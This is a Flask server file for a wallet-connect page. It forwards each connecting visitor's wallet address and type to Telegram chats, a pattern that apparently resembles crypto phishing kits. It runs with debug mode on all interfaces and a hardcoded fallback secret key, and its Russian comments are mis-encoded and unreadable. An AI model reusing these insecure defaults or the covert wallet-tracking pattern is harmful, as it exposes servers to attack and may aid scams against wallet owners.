import os
import sys
from flask import *
import requests
from dotenv import load_dotenv

# –ó–∞–≥—Ä—É–∑–∫–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'ThisIsSecretSecretSecretLife')

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '').split(',')

@app.route('/static/<path:filename>')
def static_files(filename):
    static_folder = resource_path('static')
    return send_from_directory(static_folder, filename)
def resource_path(relative_path):
    """ –ü–æ–ª—É—á–∞–µ—Ç –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å –∫ —Ä–µ—Å—É—Ä—Å—É –¥–ª—è —Ä–∞–±–æ—Ç—ã –∏ –≤ exe """
    try:
        # PyInstaller —Å–æ–∑–¥–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –∏ —Ö—Ä–∞–Ω–∏—Ç –ø—É—Ç—å –≤ _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –ø—É—Ç–∏
app.template_folder = resource_path('templates')


def send_telegram_notification(wallet_address, wallet_type):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_IDS:
        app.logger.error("Telegram bot token or chat IDs are missing")
        return

    message = (
        "üõ°Ô∏è *–ù–æ–≤–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –≥–∞–º–∞–Ω—Ü—è!*\n\n"
        f"üíº *–¢–∏–ø –≥–∞–º–∞–Ω—Ü—è:* `{wallet_type}`\n"
        f"üì≠ *–ê–¥—Ä–µ—Å–∞:* `{wallet_address}`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    for chat_id in TELEGRAM_CHAT_IDS:
        if not chat_id.strip():
            continue
        payload = {
            "chat_id": chat_id.strip(),
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            app.logger.info(f"Message sent successfully to {chat_id}: {response.json()}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Telegram send error for {chat_id}: {e}")


@app.route('/')
def home():
    session['user'] = os.urandom(16).hex()
    # –î–ª—è –æ—Ç–ª–∞–¥–∫–∏ - –≤—ã–≤–æ–¥–∏–º –ø—É—Ç—å –∫ —à–∞–±–ª–æ–Ω–∞–º
    print(f"Template directory: {app.template_folder}")
    print(f"Files in templates: {os.listdir(app.template_folder)}")
    return render_template('index.html')


@app.route('/connect_wallet', methods=['POST'])
def connect_wallet():
    data = request.json
    wallet_address = data.get('wallet_address')
    wallet_type = data.get('wallet_type')

    if not wallet_address or not wallet_type:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    try:
        session['wallet_address'] = wallet_address
        session['wallet_type'] = wallet_type

        send_telegram_notification(wallet_address, wallet_type)

        return jsonify({"status": "success", "message": "Wallet connected!"})
    except Exception as e:
        app.logger.error(f"Error: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


if __name__ == '__main__':
    # –î–ª—è –æ—Ç–ª–∞–¥–∫–∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –≥–¥–µ –∏—â–µ—Ç —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ —Ñ–∞–π–ª—ã
    print(f"Static folder: {resource_path('static')}")
    print(f"Files in static: {os.listdir(resource_path('static'))}")
    print(f"Icons in static: {os.listdir(os.path.join(resource_path('static'), 'icons'))}")

    app.run(host='0.0.0.0', port=5000, debug=True)